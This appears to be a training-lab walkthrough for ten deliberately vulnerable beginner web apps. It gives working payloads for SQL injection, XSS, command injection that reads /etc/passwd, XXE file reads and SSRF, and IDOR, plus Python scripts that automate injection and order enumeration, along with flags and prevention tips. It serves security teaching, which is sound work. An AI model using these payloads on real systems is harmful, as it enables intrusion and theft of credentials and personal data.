# Zeroday Academy - Beginner Labs Walkthrough

This document contains detailed exploitation walkthroughs for all 10 beginner labs. Each lab is a standalone vulnerable web application designed for hands-on penetration testing practice using tools like Burp Suite.

---

## Lab 1: SQL Injection - SecureBank Online

**URL:** `/labs/beginner/sqli`
**API Endpoint:** `POST /api/labs/sqli/login`
**Scenario:** A banking portal login form vulnerable to SQL injection

### Exploitation Steps

1. Navigate to the SQL Injection lab
2. Open Burp Suite and configure your browser to use the proxy
3. Attempt to login with any credentials to capture the request
4. Send the request to Repeater

### Basic SQL Injection Bypass

**Payload in username field:**
```
' OR '1'='1
```

**Alternative payloads:**
```
' OR 1=1--
admin'--
' OR ''='
1' OR '1'='1
```

### Admin Access Bypass

**Payload:**
```
admin'--
```

This bypasses authentication and logs in as the admin user.

### Flags
- `FLAG{SQL_INJECTION_AUTH_BYPASS}` - Basic authentication bypass
- `FLAG{SQL_INJECTION_ADMIN_BYPASS}` - Admin-level access with debug info

### Prevention
- Use parameterized queries/prepared statements
- Implement input validation
- Apply least privilege database accounts

---

## Lab 2: Cross-Site Scripting (XSS) - TechBlog

**URL:** `/labs/beginner/xss`
**API Endpoints:**
- `GET /api/labs/xss/comments` - Retrieve comments
- `POST /api/labs/xss/comments` - Add new comment
- `GET /api/labs/xss/search?q=` - Search articles

### Stored XSS Attack

1. Navigate to the blog comments section
2. In Burp Suite, intercept the POST request when submitting a comment
3. Inject JavaScript in the author or content field

**Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### Reflected XSS Attack

1. Use the search functionality
2. Inject JavaScript in the search query parameter

**Payload:**
```
/api/labs/xss/search?q=<script>alert('XSS')</script>
```

### Flags
- `FLAG{STORED_XSS_INJECTION}` - Stored XSS in comments
- `FLAG{REFLECTED_XSS_SEARCH}` - Reflected XSS in search

### Prevention
- Encode output (HTML entity encoding)
- Use Content-Security-Policy headers
- Validate and sanitize all input

---

## Lab 3: Authentication Bypass - Admin Panel

**URL:** `/labs/beginner/auth-bypass`
**API Endpoint:** `POST /api/labs/auth/login`
**Scenario:** Administrative control panel with weak authentication

### Exploitation Steps

1. Navigate to the admin login panel
2. Intercept the login request with Burp Suite
3. Use SQL injection to bypass authentication

**Payloads:**
```
admin'-- (in username field)
' OR '1'='1 (in password field)
' OR 1=1--
```

### Flags
- `FLAG{AUTH_BYPASS_SQL_INJECTION}` - Basic bypass
- `FLAG{ADMIN_ACCESS_GAINED}` - Full admin access

### Prevention
- Use parameterized queries
- Implement multi-factor authentication
- Add account lockout policies

---

## Lab 4: Command Injection - Network Diagnostics

**URL:** `/labs/beginner/cmdi`
**API Endpoint:** `POST /api/labs/cmdi/ping`
**Scenario:** Server administration tool with ping functionality

### Exploitation Steps

1. Navigate to the network diagnostics tool
2. Enter a valid host to see normal behavior
3. Inject commands using shell metacharacters

**Payloads:**
```
127.0.0.1; cat /etc/passwd
127.0.0.1 | ls
127.0.0.1 & whoami
$(cat /etc/passwd)
`id`
```

### Automated Exploitation (Python)
```python
import requests

url = "https://your-site/api/labs/cmdi/ping"
payloads = [
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1 | ls",
    "127.0.0.1 & id"
]

for payload in payloads:
    r = requests.post(url, json={"host": payload})
    print(r.json())
```

### Flag
- `FLAG{COMMAND_INJECTION_RCE}` - Remote code execution achieved

### Prevention
- Never pass user input directly to system commands
- Use allowlists for valid inputs
- Implement command argument escaping

---

## Lab 5: Sensitive Data Exposure - Healthcare Portal

**URL:** `/labs/beginner/sensitive-data`
**API Endpoints:**
- `GET /api/labs/sensitive/patients` - List patients
- `GET /api/labs/sensitive/patients/:id` - Get patient details

### Exploitation Steps

1. Navigate to the healthcare portal
2. View the list of patients (basic info only)
3. Access individual patient profiles via API
4. Observe that sensitive data (SSN, medical history) is exposed

**Request:**
```
GET /api/labs/sensitive/patients/1
```

**Response includes:**
- Social Security Number
- Full medical history
- Insurance policy details
- Blood type, allergies, conditions

### Flag
- `FLAG{SENSITIVE_DATA_EXPOSED}` - Accessing any patient's full profile

### Prevention
- Implement proper access control
- Use data masking for sensitive fields
- Apply field-level encryption
- Audit access to PII/PHI

---

## Lab 6: XML External Entity (XXE) - Document Importer

**URL:** `/labs/beginner/xxe`
**API Endpoint:** `POST /api/labs/xxe/parse`
**Content-Type:** `application/xml`

### Exploitation Steps

1. Navigate to the XML importer tool
2. Submit a valid XML document first
3. Use Burp Suite to modify the XML with malicious entities

### File Read Attack

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <content>&xxe;</content>
</data>
```

### SSRF Attack

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<data>&xxe;</data>
```

### Flags
- `FLAG{XXE_FILE_READ_PASSWD}` - Reading /etc/passwd
- `FLAG{XXE_FILE_READ_SHADOW}` - Reading /etc/shadow
- `FLAG{XXE_FILE_ACCESS}` - General file access
- `FLAG{XXE_SSRF_ATTACK}` - SSRF via XXE
- `FLAG{XXE_PARAMETER_ENTITY}` - Parameter entity expansion

### Prevention
- Disable external entities in XML parser
- Use less complex data formats (JSON)
- Validate and sanitize XML input

---

## Lab 7: Broken Access Control - HR Portal

**URL:** `/labs/beginner/access-control`
**API Endpoint:** `GET /api/labs/access/users/:id`
**Scenario:** HR system with improper authorization checks

### Exploitation Steps

1. Log in as a regular employee (User ID: 10)
2. View your own profile (normal behavior)
3. Modify the user ID in the URL to access other profiles
4. Access executive profiles with sensitive salary data

**IDOR Attack:**
```
GET /api/labs/access/users/1   (CEO profile)
GET /api/labs/access/users/2   (CFO profile)
GET /api/labs/access/users/3   (HR Director)
```

### Flags
- `FLAG{IDOR_PRIVILEGE_ESCALATION}` - Accessing admin/manager profiles
- `FLAG{IDOR_HORIZONTAL_ACCESS}` - Accessing peer employee profiles

### Prevention
- Implement proper authorization checks
- Use indirect object references
- Validate user permissions for each request

---

## Lab 8: Security Misconfiguration - EcoShop

**URL:** `/labs/beginner/misconfig`
**API Endpoint:** `GET /api/labs/misconfig/search?q=`
**Scenario:** E-commerce site with verbose error messages

### Exploitation Steps

1. Navigate to the product search
2. Enter special characters to trigger errors
3. Observe exposed database credentials in error response

**Payload:**
```
/api/labs/misconfig/search?q='
/api/labs/misconfig/search?q="
/api/labs/misconfig/search?q=\
```

**Response exposes:**
- Database connection string with credentials
- PostgreSQL server version
- API keys
- Internal file paths
- Stack traces

### Flag
- `FLAG{VERBOSE_ERROR_EXPOSURE}` - Triggering error disclosure

### Prevention
- Disable verbose error messages in production
- Use generic error pages
- Log detailed errors server-side only
- Never expose credentials in responses

---

## Lab 9: API Data Leakage - Developer Portal

**URL:** `/labs/beginner/api-sensitive`
**API Endpoint:** `GET /api/labs/api-leak/profile?debug=true`
**Scenario:** API returning sensitive information in debug mode

### Exploitation Steps

1. Navigate to the developer portal
2. Access the profile API endpoint
3. Add `?debug=true` query parameter
4. Observe exposed secrets in response

**Request:**
```
GET /api/labs/api-leak/profile?debug=true
```

**Exposed data:**
- Password hashes
- Database connection strings
- JWT signing secrets
- Internal API keys

### Flag
- `FLAG{API_DEBUG_MODE_EXPOSURE}` - Accessing debug mode data

### Prevention
- Disable debug endpoints in production
- Use feature flags tied to environment
- Audit API responses for sensitive data
- Implement proper access control

---

## Lab 10: IDOR & Predictable IDs - Order System

**URL:** `/labs/beginner/idor`
**API Endpoints:**
- `GET /api/labs/idor/orders/my` - Your orders
- `GET /api/labs/idor/orders/:id` - Order details

### Exploitation Steps

1. View your own orders (1003, 1004)
2. Note the sequential order ID pattern
3. Access other users' orders by manipulating the ID

**IDOR Attack:**
```
GET /api/labs/idor/orders/1001   (Alice's order)
GET /api/labs/idor/orders/1002   (Bob's order)
```

**Exposed data:**
- Full shipping addresses
- Payment card numbers
- Order details and pricing

### Automation Script
```python
import requests

base_url = "https://your-site/api/labs/idor/orders"

for order_id in range(1001, 1010):
    r = requests.get(f"{base_url}/{order_id}")
    data = r.json()
    if "order" in data:
        print(f"Order {order_id}: {data['order']['shippingAddress']['name']}")
```

### Flag
- `FLAG{IDOR_ORDER_ACCESS}` - Accessing another user's order

### Prevention
- Use UUIDs instead of sequential IDs
- Implement proper authorization checks
- Validate user ownership of resources

---

## Summary

| Lab | Vulnerability | Flag(s) |
|-----|--------------|---------|
| 1 | SQL Injection | `FLAG{SQL_INJECTION_AUTH_BYPASS}`, `FLAG{SQL_INJECTION_ADMIN_BYPASS}` |
| 2 | XSS | `FLAG{STORED_XSS_INJECTION}`, `FLAG{REFLECTED_XSS_SEARCH}` |
| 3 | Auth Bypass | `FLAG{AUTH_BYPASS_SQL_INJECTION}`, `FLAG{ADMIN_ACCESS_GAINED}` |
| 4 | Command Injection | `FLAG{COMMAND_INJECTION_RCE}` |
| 5 | Sensitive Data | `FLAG{SENSITIVE_DATA_EXPOSED}` |
| 6 | XXE | `FLAG{XXE_FILE_READ_PASSWD}`, `FLAG{XXE_SSRF_ATTACK}`, etc. |
| 7 | Access Control | `FLAG{IDOR_PRIVILEGE_ESCALATION}`, `FLAG{IDOR_HORIZONTAL_ACCESS}` |
| 8 | Misconfiguration | `FLAG{VERBOSE_ERROR_EXPOSURE}` |
| 9 | API Leakage | `FLAG{API_DEBUG_MODE_EXPOSURE}` |
| 10 | IDOR | `FLAG{IDOR_ORDER_ACCESS}` |

Total: 15+ flags across 10 labs
